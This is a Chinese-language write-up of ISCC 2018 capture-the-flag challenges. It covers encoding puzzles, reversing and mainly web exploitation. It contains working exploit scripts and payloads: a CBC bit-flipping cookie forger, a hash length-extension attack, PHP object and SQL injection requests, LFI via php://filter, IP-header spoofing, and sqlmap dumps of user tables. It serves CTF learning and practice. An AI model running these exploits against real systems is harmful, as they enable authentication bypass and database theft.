TYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA== 一直base64解码，得到 1U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= 以U2FsdGVkX1开头的密文是AES加密，，然后使用openssl进行解密，顺带猜密码，最后在encrypt解密得到 1缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 到与佛论禅进行解密得出flag为：把我复制走 凯撒十三世题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。 这个比较明显，就是取凯撒的13行，也就是rot13，结果是roqtp697t95j3，再进行键盘密码解密，得到flag为：yougotme，唯一的小坑就是对这个键盘密码的时候。 有趣的ISCC附件地址有趣的ISCC 题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？ 查看图片信息，最末尾发现了 1&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.9.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.4.9.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.5.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.9.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.7.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.0.;.&amp;.#.4.8.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.5.4.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.5.3.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.4.;.&amp;.#.1.0.1.;.&amp;.#.9.2.;.&amp;.#.1.1.7.;.&amp;.#.4.8.;.&amp;.#.4.8.;.&amp;.#.5.5.;.&amp;.#.1.0.0.; 处理还原，得出 1\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d 再还原就成了flag{iscc is fun} 数字密文题目：这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921 16进制转个文本就行。 挖宝计划题目附件：挖宝计划 题目：小明手里有一个宝箱（treasureBox.zip），但无法打开。求助于先知，但只得到了一张藏宝图（getFlay.py），你能参透先知的深意，帮小明挖出宝藏吗？ 去年没解出来的数据分析题目。 查看zip的内容，发现是有解压密码的，但是不知道是什么，发现zip内也有一个getFlag.py，大小及CRC值一致，所以推断是存在明文攻击的解压漏洞。 但是，还是与去年一样的问题。但是根据去年主办方在线下决赛后发出的文章来看，是有些小提示的 1&quot;以文找文&quot;（寻&quot;文&quot;启事 众里寻他千百度，蓦然回首，那人却在，灯火阑珊处）数据分析题 降低题目难度后，思路：将6000个文件与sample对比，找到内容最为接近的5个文件，取其文件MD5值，emmmm。 嵌套ZIPs题目附件：嵌套ZIPs 题目：A老师听说b同学要去参加今年的ISCC，便出题考一考b同学，你能帮b同学渡过难关吗？ 看到ZIPs感觉就是一直要爆破的节奏。没什么思路那就爆破了。 解出来，又是明文攻击 ISCC_!S_my_favor1te_CTF 0x02 Web比较数字大小 限制了长度为3，将maxlength修改为大于3的值再输入超过3位数的数字即可，比如maxlength=33，输入值为12345 或者直接抓包改值。 flag为：768HKyu678567&amp;*&amp;K 你能跨过去吗？页面显示 12345Key Words:XSS如果你对xss了解的话,那你一定知道key是什么了，加油！http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413 对其中的base64编码进行解码，得出&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script，提交/%nsfocusXSStest%/即可得出flag 一切都是套路hit:好像有个文件忘记删了 打开index.php.txt 发现 1234567891011121314151617&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $k =&gt; $v)&#123; $$k = $$v;&#125;foreach ($_POST as $k =&gt; $v)&#123; $$k = $v;&#125;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt; 需要满足3个if才能得到flag，这是个$$导致的变量覆盖问题。题目中使用了两个foreach并且也使用了$$，两个foreach中对$$k的处理是不一样的，满足条件后会将$flag里面的值打印出来。 但由于第5与第13-14行的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403，然后利用die($_200)或 die($_403)将flag打印出来。 你能绕过吗?hit:没过滤好啊 这个题目，最开始以为是注入题，毕竟这个题目这个显示。 尝试了id的注入点，最后在尝试修改f参数为index.php，发现带有php参数的显示了 error...，最后的尝试 index.php的源码为 123456789101112&lt;?php #ISCC&#123;LFIOOOOOOOOOOOOOO&#125; if(isset($_GET[&apos;f&apos;]))&#123; if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123; die(&quot;error...&quot;); &#125; else&#123; include($_GET[&apos;f&apos;] . &apos;.php&apos;); &#125; &#125; ?&gt; 原来如此，怪不得带有php的都报错了。 web02打开链接显示 1错误！你的IP不是本机ip！ 应该就是伪造IP了。尝试各种伪造IP的http头 12345X-Forwarded-ForClient-IPx-remote-IPx-originating-IPx-remote-addr 本地的诱惑题目：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题） 右键源码： 12345678910111213&lt;?php //print_r($_SERVER);$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);if($arr[0]==&apos;127.0.0.1&apos;)&#123; //key echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;&#125;else&#123; echo &quot;必须从本地访问！&quot;;&#125;?&gt;&lt;?php//SAE 服务调整,该题目无法继续...可尝试自行搭建环境测试.echo file_get_contents(__FILE__); Please give me username and password!访问index.php.txt。 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$flag = &quot;***********&quot;; if(isset($_GET[&apos;username&apos;]))&#123; if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123; $a = fla; echo &quot;very good!Username is right&quot;; &#125; else&#123; print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;&#125;elseprint &apos;Please give me username or password!&apos;;if (isset($_GET[&apos;password&apos;]))&#123; if (is_numeric($_GET[&apos;password&apos;]))&#123; if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123; if ($_GET[&apos;password&apos;] &gt; 999)&#123; $b = g; print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;; &#125;else print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;&#125;if ($a.$b == &quot;flag&quot;) print $flag;?&gt; 绕过即可username[]=&amp;password=9e9 试试看题目：随意开火 查看图片，观察URL为/show.php?img=1.jpg。已经没有别的页面了，估计就是文件读取 12345?img=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=show.php # File not found.不正常。。。。?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=1.jpg # 正常访问?img=php://filter/read=convert.base64-encode/resource=1.jpg=php://filter/read=convert.base64-encode/resource=show.php # 正常访问 有戏，右键查看源码，发现已经能读到PHP源码了，接下来就是直接找flag所在，最后在../flag.php找到flag 请ping我的ip 看你能Ping通吗？题目：我都过滤了，看你怎么绕。 题目地址：http://118.190.152.202:8018 直接访问http://118.190.152.202:8018/flag.txt 就出现flag了。 正确解法是 SQL注入的艺术扫描扫到/admins，访问直接下载，打开发现是数据库链接信息，内部含有flag。 正确解法：宽字节注入 12http://118.190.152.202:8015/index.php?id=1%df%27http://118.190.152.202:8015/index.php?id=1%df%27%20and%201=1%20--+ web0112345678910&lt;?php highlight_file(&apos;2.php&apos;); $flag=&apos;&#123;***************&#125;&apos;; if (isset($_GET[&apos;password&apos;])) &#123; if (strcmp($_GET[&apos;password&apos;], $flag) == 0) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; &#125; ?&gt; 想都不想，直接/password[]=flag Collide题目：那么长的秘钥，要爆破到什么时候啊 1234567891011121314151617181920&lt;?phpinclude &quot;secret.php&quot;;@$username=(string)$_POST[&apos;username&apos;];function enc($text)&#123; global $key; return md5($key.$text);&#125;if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123; if(is_numeric(strpos($username, &quot;admin&quot;)))&#123; die($flag); &#125; else&#123; die(&quot;you are not admin&quot;); &#125;&#125;else&#123; setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7); setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);&#125;show_source(__FILE__); hash长度扩展攻击 $key变量我们是不知道的，但是从len值中能获取到长度为46 从verify中得到md5($key.guest)的值为：78cfc57d983b4a17e55828c001a3e781 成功登陆条件：username=guestxxxxxxxxadmin，并且verify要等于md5($key.uaername) 123456hashpump -s 78cfc57d983b4a17e55828c001a3e781 -d guest -k 46 -a admin得出5f585093a7fe86971766c3d25c43d0ebguets\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin处理guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin 这个提交得看脸。 ISCC{MD5_1s_n0t_5afe} Only admin can see flag查看源码发现提示index.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude &apos;sqlwaf.php&apos;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123; $iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $iv.=chr(rand(1,255)); &#125; return $iv;&#125;function login($info)&#123; $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;; die();&#125;function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123; $username=waf((string)$_POST[&apos;username&apos;]); $password=waf((string)$_POST[&apos;password&apos;]); if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;&#125;?&gt; CBC字节反转攻击攻击题目，先将输入的账号密码序列化，也就是获取$plain。 123456789&lt;?php$username = &apos;Admin&apos;;$password = &apos;RcoIl&apos;;$info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);$plain = serialize($info);echo $plain;?&gt;运算结果：a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125; 我们的目的就是将Admin中的A转换成a，接下来就是把明文分成16个字节的块（因为AES-128以128位为一块,正好16字节） 1234a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125; 我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__=&apos;RcoIl&apos;import base64 import requestsimport urllibfrom urllib import unquoteurl = &apos;http://118.190.152.202:8001/&apos;data = &#123; &apos;username&apos;: &apos;Admin&apos;, &apos;password&apos;: &apos;12345&apos;,&#125;def Cookie(): s = requests.Session() cookies = s.post(url,data=data).cookies cipher = base64.b64decode(unquote(cookies[&apos;cipher&apos;])) cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(&apos;A&apos;) ^ ord(&apos;a&apos;)) + cipher[10:] Cookie = &quot;PHPSESSID=&quot;+urllib.unquote(cookies[&apos;PHPSESSID&apos;])+&apos;; &apos;+&quot;iv=&quot; + urllib.unquote(cookies[&apos;iv&apos;])+&apos;; &apos;+&quot;cipher=&quot; + urllib.quote(base64.b64encode(cipher)) header = &#123; &quot;Cookie&quot;: Cookie &#125; try: request = requests.post(url , headers = header) except Exception as e: print e else: print request.text[18:][:-24] print Cookie Cookie() 运行结果：C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D查看unserialize的内容 þ¨²¦ãÙ9æpÒÄ¼Ume&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;;&#125;,已成功改成admin 但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。 12345678910111213141516171819202122232425#!/usr/bin/env python#! -*- coding:utf-8 -*-__author__=&apos;RcoIl&apos;import base64import urllibimport requestsurl = &apos;http://118.190.152.202:8001/&apos;iv = base64.b64decode(&quot;w8wkcnN//ERbrLkywW37hA==&quot;)plain = base64.b64decode(&quot;C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&quot;)want = &apos;a:2:&#123;s:8:&quot;userna&apos;newiv = &apos;&apos;for i in range(16): newiv += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))iv = urllib.quote(base64.b64encode(newiv)) # qQi%2BwLqqJaVYDSoxdtspsA%3D%3Dcookie = &quot;PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=&quot;+ iv +&quot;; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D&quot;header = &#123; &quot;Cookie&quot;: cookie &#125;try: request = requests.post(url , headers = header) except Exception as e: print eelse: print request.text 替换提交即可登陆真正的admin用户。 1&lt;p&gt;Hello admin&lt;/p&gt;&lt;p&gt;Flag is ISCC&#123;123dasd89as10aas&#125;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt; php是世界上最好的语言12345678910111213141516171819202122232425&lt;html&gt; &lt;body&gt; &lt;form action=&quot;md5.php&quot; method=&quot;post&quot; &gt; 用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt; 密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt; &lt;input type=&quot;submit&quot; &gt; &lt;/body&gt; &lt;/html&gt; &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; &#125; else&#123; $username=&quot;hello&quot;; $password=&quot;hello&quot;; &#125; if(md5($password) == 0)&#123; echo &quot;xxxxx&quot;; &#125; show_source(__FILE__); ?&gt; 看到第19行，明显的弱类型绕过。密码填写240610708 123456&lt;?php include &apos;flag.php&apos;; $a = @$_REQUEST[&apos;a&apos;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt; 绕过即可 12no_md5.php?a=flagISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125; Only Admin题目：听说只有admin可以看到flag？ 最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。 扫描目录，发现有一个web.zip文件。 1234567891011web├─ .vscode│ └─ launch.json├─ MessageController.class.php├─ UserController.class.php├─ config.php # 配置文件├─ index.php # 登陆后主页├─ login.php # 登陆页面├─ reg.php # 注册页面├─ send.php└─ show.php 审计，难受。 其实也就是带cookie访问的问题。 exp 123456789101112131415161718192021#!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport base64url=&quot;http://118.190.152.202:8020/&quot;def attack(url, payload): s=requests.session() u1 = url + &quot;send.php&quot; plen = len(payload) payload = &apos;a:2:&#123;s:5:&quot;email&quot;;O:7:&quot;Message&quot;:4:&#123;s:3:&quot;msg&quot;;s:&apos;+str(plen)+&apos;:&quot;&apos;+payload+&apos;&quot;;s:4:&quot;from&quot;;N;s:2:&quot;to&quot;;N;s:2:&quot;id&quot;;i:-1;&#125;s:8:&quot;password&quot;;s:5:&quot;23333&quot;;&#125;&apos; cookies = &#123;&apos;ckSavePass&apos;: base64.b64encode(payload)&#125; r = s.get(u1, cookies=cookies) u2=&quot;http://118.190.152.202:8020/&quot; +&apos;config.php&apos; r2=s.get(u2) print r2.headers[&apos;Set-Cookie&apos;] return Falsepayload=&quot;111&apos; || 1=1 -- 111&quot;attack(url,payload)运行结果：csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly 为什么这么简单啊进入， 123第一关第二关需要从 http://edu.xss.tv 进入，并且只有我公司的IP地址才可以进入第二关，公司IP为：110.110.110.110 伪造IP 12345678910111213GET / HTTP/1.1Host: 118.190.152.202:8016Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=b604vp88ds9coh4352d3dncih2X-Forwarded-For: 110.110.110.110Referer: http://edu.xss.tvConnection: close 进入到第二关，寻找密码。右键源码看到password.js，解密其中的base64，得到密码xinyiji.com flag：B1H3n5u0xI2n9JIscc Sqli在username存在延迟注入。 1234567891011121314151617181920212223python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;user&quot; -C &quot;username,pass&quot; --dump sqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=%E2%80%98&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))fbFG) AND &apos;xEit&apos;=&apos;xEit&amp;password=&apos;---[15:04:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:04:25] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12运行结果：Database: sqli_databaseTable: user[2 entries]+----------+----------------------------------+| username | pass |+----------+----------------------------------+| test | 098f6bcd4621d373cade4e832627b4f6 |（test）| admin | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）+----------+----------------------------------+ 登陆发现提示flag在另一个字段 12345678910python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;news&quot; -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; --dump运行结果：Database: sqli_databaseTable: news[1 entry]+--------------------------------+| kjafuibafuohnuvwnruniguankacbh |+--------------------------------+| flag&#123;hahaha999999999&#125; |+--------------------------------+ 有种你来绕题目：我都过滤了，看你怎么绕。记住是mysql 只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin 注入，过滤了空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d等，需要想办法用其他操作符连接注入语句和闭合’。 原文操作：https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/ 得出密码为0416af0a8accf2be556a8e131438b814(nishishabi1438) 登陆之后和原题不一样了，直接填写flag就出现了flag值。 flag{sql_iNjEct_Is_Easy} 0x03 ReverseRSA256三个加密文件一个公钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import gmpy2def ModExp(n, k, m): a = list(bin(k))[2:] a.reverse() s = 1 for i in a: if i == &apos;1&apos;: s = (s * n) % m n = (n * n) % m return sn = int(&apos;D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB&apos;, 16)print(&apos;n is&apos;)print(n)p = gmpy2.mpz(302825536744096741518546212761194311477)q = gmpy2.mpz(325045504186436346209877301320131277983)e = gmpy2.mpz(65537)phi_n = (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print(&quot;d is:&quot;)print(d)p = 302825536744096741518546212761194311477q = 325045504186436346209877301320131277983def ByteToHex( bins ): return &apos;&apos;.join( [ &quot;%02X&quot; % x for x in bins ] ).strip()file1 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1&quot;, &apos;rb&apos;).read()c1 = int(ByteToHex(file1), 16)print(&quot;c1&quot;, c1)file2 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2&quot;, &apos;rb&apos;).read()c2 = int(ByteToHex(file2), 16)file3 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3&quot;, &apos;rb&apos;).read()c3 = int(ByteToHex(file3), 16)m = p * qflag1 = ModExp(c1, d, m)flag2 = ModExp(c2, d, m)flag3 = ModExp(c3, d, m)flag = &apos;0&apos; + hex(flag1)[2:] + &apos;0&apos; + hex(flag2)[2:] + &apos;0&apos; + hex(flag3)[2:]print(flag)i = 0result = &apos;&apos;for i in range(0, len(flag), 2): result += chr((int(flag[i:i+2], 16)))print(result) My math is bad程序地址：My math is bad 题目：I think the math problem is too difficult for me. 12# file ReverseReverse: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped IDA又是不显示main函数 满足sub_400766()就输出sub_400B16()，那就，直接看sub_400B16() ？看了看，不行哦，捷径走不了，那就看sub_400766()里的东西。 12345678910111213141516171819202122232425262728if ( strlen(s) == 32 )&#123; v3 = unk_6020B0; v4 = unk_6020B4; v5 = unk_6020B8; v6 = unk_6020BC; result = 0; if ( dword_6020A4 * (signed __int64)*(signed int *)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed int *)s == 397958918 &amp;&amp; 3 * *(signed int *)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL &amp;&amp; 27LL * dword_6020A4 + *(signed int *)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL ) &#123; srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL ) result = 1; &#125;&#125; 结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成 12s、dword_6020A4、dword_6020A8、dword_6020AC、unk_6020B0(v3)、unk_6020B4(v4)、unk_6020B8(v5)、unk_6020BC(v6) 